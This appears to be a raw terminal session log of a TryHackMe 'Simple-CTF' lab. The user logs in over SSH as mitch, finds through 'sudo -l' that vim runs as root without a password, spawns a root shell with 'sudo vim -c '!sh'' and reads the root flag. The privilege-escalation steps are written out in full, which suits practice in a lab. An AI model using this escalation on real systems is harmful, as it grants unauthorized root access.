Script started on 2020-11-20 14:24:35-03:00 [TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="166" LINES="39"]
[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# ssh -p mich[K[Ktche[K@[7m10.10.158.248[27m10.10.158.248 [K2 mitch@10.10.158.2482 mitch@10.10.158.2482 mitch@10.10.158.2482 mitch@10.10.158.248
[?2004lmitch@10.10.158.248's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Fri Nov 20 18:54:25 2020 from 10.9.185.104
$ 
$ id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
$ whoami
mitch
$ 
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ 
$ vi  sudo vim -c '!sh'
[?1049h[?1h=[2;1Hâ–½[6n[2;1H  [1;1H]11;?[1;39r[?12;25h[?12l[?25h[27m[23m[m[H[2J[?25l[39;1H:!sh[?1l>[?12l[?25h[?1049l
# ^[[2;2Rid
sh: 1: [2: not found
sh: 1: 2Rid: not found
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
# cd /root
# ls
root.txt
# cat   
# cat root.txt
W3ll d0n3. You made it!
# exit

Press ENTER or type command to continue[?1049h[?1h=[>c[27m[23m[m[H[2J[?25l[2;1H[94m~                                                                                                                                                                     [3;1H~                                                                                                                                                                     [4;1H~                                                                                                                                                                     [5;1H~                                                                                                                                                                     [6;1H~                                                                                                                                                                     [7;1H~                                                                                                                                                                     [8;1H~                                                                                                                                                                     [9;1H~                                                                                                                                                                     [10;1H~                                                                                                                                                                     [11;1H~                                                                                                                                                                     [12;1H~                                                                                                                                                                     [13;1H~                                                                                                                                                                     [14;1H~                                                                                                                                                                     [15;1H~                                                                                                                                                                     [16;1H~                                                                                                                                                                     [17;1H~                                                                                                                                                                     [18;1H~                                                                                                                                                                     [19;1H~                                                                                                                                                                     [20;1H~                                                                                                                                                                     [21;1H~                                                                                                                                                                     [22;1H~                                                                                                                                                                     [23;1H~                                                                                                                                                                     [24;1H~                                                                                                                                                                     [25;1H~                                                                                                                                                                     [26;1H~                                                                                                                                                                     [27;1H~                                                                                                                                                                     [28;1H~                                                                                                                                                                     [29;1H~                                                                                                                                                                     [30;1H~                                                                                                                                                                     [31;1H~                                                                                                                                                                     [32;1H~                                                                                                                                                                     [33;1H~                                                                                                                                                                     [34;1H~                                                                                                                                                                     [35;1H~                                                                                                                                                                     [36;1H~                                                                                                                                                                     [37;1H~                                                                                                                                                                     [38;1H~                                                                                                                                                                     [m[39;149H0,0-1[9CAll[14;75HVIM - Vi IMproved[16;76Hversion 7.4.1689[17;72Hby Bram Moolenaar et al.[18;56HModified by pkg-vim-maintainers@lists.alioth.debian.org[19;62HVim is open source and freely distributable[21;69HBecome a registered Vim user![22;61Htype  :help register[34m<Enter>[m   for information [24;61Htype  :q[34m<Enter>[m               to exit         [25;61Htype  :help[34m<Enter>[m  or  [34m<F1>[m  for on-line help[26;61Htype  :help version7[34m<Enter>[m   for version info[1;1H[?12l[?25h[?25l[39;149H[K[39;1H:[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l[?1l>[?12l[?25h[?1049l
$ ei  exit -f
-sh: 8: exit: Illegal number: -f
$ e exit
Connection to 10.10.158.248 closed.
[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exit
[?2004lexit

Script done on 2020-11-20 14:27:48-03:00 [COMMAND_EXIT_CODE="2"]
